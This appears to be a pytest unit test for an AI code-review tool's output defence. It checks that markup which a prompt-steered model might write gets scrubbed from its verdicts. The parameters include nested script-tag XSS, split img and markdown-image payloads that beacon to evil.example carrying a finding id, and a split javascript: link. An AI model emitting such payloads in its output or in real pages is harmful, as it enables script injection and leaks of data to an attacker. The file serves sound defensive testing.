"""Adversarial model answers against the output defence: what a steered model might write."""

import pytest

from codekavach.llm.defence.output import validate_verdict
from tests.unit.llm.test_review_intelligence import verdict


@pytest.mark.parametrize(
    "nested",
    [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "!<a>[x](http://evil.example/?d=fn_1)",
        "<im<img src=a>g src=http://evil.example/fn_1>",
        "[x](java<a>script:alert(1))",
    ],
)
def test_markup_split_by_a_removable_fragment_does_not_survive_the_scrub(nested: str) -> None:
    cleaned, report = validate_verdict(verdict(impact=f"See {nested} now", remediation=nested))
    for text in (cleaned.impact, cleaned.remediation):
        assert "<script" not in text and "<img" not in text and "javascript:" not in text
        assert "![" not in text
    assert report.markup_removed >= 2
